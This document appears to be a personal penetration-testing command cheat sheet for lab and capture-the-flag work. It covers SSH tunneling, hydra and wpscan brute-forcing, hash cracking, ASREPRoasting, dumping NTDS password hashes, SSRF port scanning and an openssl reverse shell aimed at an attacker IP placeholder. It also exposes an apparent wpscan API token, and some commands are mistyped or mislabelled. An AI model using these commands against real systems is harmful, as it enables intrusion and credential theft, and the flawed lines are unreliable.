


## SSH Tunneling 101
```bash
# SSH local port forward to reach  an_internal_server_ip:port via server_ip
ssh tunneler@server_ip -p 2222 -L 1234:an_internal_server_ip:80 
# Now curl localhost:1234 will fetch an_internal_server_ip:80 which is reachable from server_ip only

# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
ssh tunneler@server_ip -p 2222 -D 1080 
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only

# ProxyJump ssh to an_internal_host via ssh server_ip
ssh -J tunneler@server_ip:2222 whistler@an_internal_host # which is only accessible from server_ip

# SSH remote port forward to send traffic back to our local port from a port of server_ip
ssh whistler@server_ip -p 2222 -L 58671:localhost:1234 # 
# this will listen on port 58671 of server_ip and tunnel the traffic back to us on loclahost:1234; nc -nlvp 1234 to receive for example

# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
ssh -j firstuser@1st_box:2222 seconduser@2nd_box -D 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only

# bypass first time prompt when have non-interactive shell

ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...

```

## SSH reverse tunneling
```bash
ssh -f -N -R 8000:10.3.3.14:80 -R 4443:10.3.3.14:443 -R 33306:10.3.3.14:3306 -R 33389:10.3.3.14:3389  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@192.168.19.57

# kill with
ps -C ssh
kill -9 <pid>
```

## create self-signed ssl certificate
```bash
openssl req -newkey rsa:2048 -nodes -keyout my_cert.key -x509 -days 36
2 -out my_cert.crt

# convert to .pem if needed:
openssl pkcs12 -export -in my_cert.crt -inkey my_cert.key -out my_cert.p12
openssl pkcs12 -in my_cert.p12 -nodes -out my_cert.pem
```

## searchsploit
```bash
searchsploit -www query # show exploitdb link instead
searchsploit -x /path/to/exploit # read the exploit file
searchsploit -m /path/to/exploit # mirror exploit file to current directory
```


## hydra web form bruteforce
```bash
hydra -l admin -P ~/git/SecLists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.10.75 http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username"

hydra -l admin -P ~/git/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -t 64 # 64 threads
# change to https-web-form for port 443
```
## hydra ssh brute
```bash
hydra -l username -P wordlist.txt ssh <Target-IP> -s 22222
```

## get glibc version
```bash
ldd --version
```
## compile for 32 bit from a 64bit os, install `gcc-multilib` first
```bash
gcc -m32 -D_GNU_SOURCE -o suid32 suid.c
```
## transfer files through netcat
```bash
# start listening for download
nc -nlvp 9001 > dump.txt
# start uploading from target box
nc ip port < file.txt

```


## bruteforce zip file with fcrackzip
```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip 
```
## bruteforce zip file with john
```bash
zip2john myfile.zip > johnkey
john johnkey --wordlist=/usr/share/wordlists/rockyou.txt
```

## port knocking on 3 ports using nmap
```bash
for x in $(echo 22 23 24);do nmap -PN --host-timeout 201 --max-retries 0 -r -p$x 192.168.0.106;done
```

## classic gobuster
```bash
gobuster dir -u http://10.10.10.55:8080 -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o gobuster/http-dlist-lower-small.txt
```

## list contents of .vhd file
```bash
7z l filename.vhd
```


## do a local port scan using SSRF
```bash
# --hl=2 is hide responses that has 2 lines. 
wfuzz -c --hl=2 -z range,1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
```

## dump password hasshes from ntds dump file using system hive file and the dit file
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM.bin LOCAL
# tip: users ending with $ are system accounts and has hard passwords, look for other ones
```
## wpscan enum all plugins 
```bash
wpscan --url http://10.10.10.88/webservices/wp/ --enumerate ap --plugins-detection aggressive --force --api-token o3Oj8OysJNmHbVf5PoEMe6ASLUrac3Q5KJB8G0aguz4
```

## wpscan brute
```bash
wpscan --usernames tom -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url http://192.168.137.131/prehistoricforest/ --no-update
```

## generate client certificate from ca.key
```bash
openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out rh.pem
openssl pkcs12 -export -in rh.pem -inkey ca.key -out rh.p12
```

## openssl reverse shell 
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s
```

## generate passwd hash with openssl
```sh
openssl passwd -1 -salt rh0x01 password123
```

## check ASREPRoast for all domain users (without credentials)
```bash
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

## john crack krb5asrep hash
```bash
john --format:krb5asrep alfresco.kerb --wordlist=/usr/share/wordlists/rockyou.txt
```


## generate password wordlist with crunch
```bash
crunch 13 13 -t bev,%%@@^1995 -o wordlist.txt
# 13 13 - min max length
# bev - start's with
# @ will insert lower case characters
# , will insert upper case characters
# % will insert numbers
# ^ will insert symbols
```


## mount nfs share
```bash
mount -t nfs -o vers=3 10.1.1.1:/home/ ~/home


mount -t nfs4 -o proto=tcp,port=2049 127.0.0.1:/srv/Share mountpoint
```

## mount smb share
```sh
sudo mount -t cifs //10.1.1.1/'sharename' /home -o rw,vers=1.0,dir_mode=0777,file_mode=0777,nounix
# or
sudo mount -t cifs -o vers=1.0 //10.11.1.136/'Sharename' sharemount
```

## login to windows machine in the network with proxychains

```bash
xfreerdp /u:admin /v:ip_address +clipboard
```


LINK - https://raw.githubusercontent.com/rayhan0x01/my-cmd-stash/master/linux_cmd.md
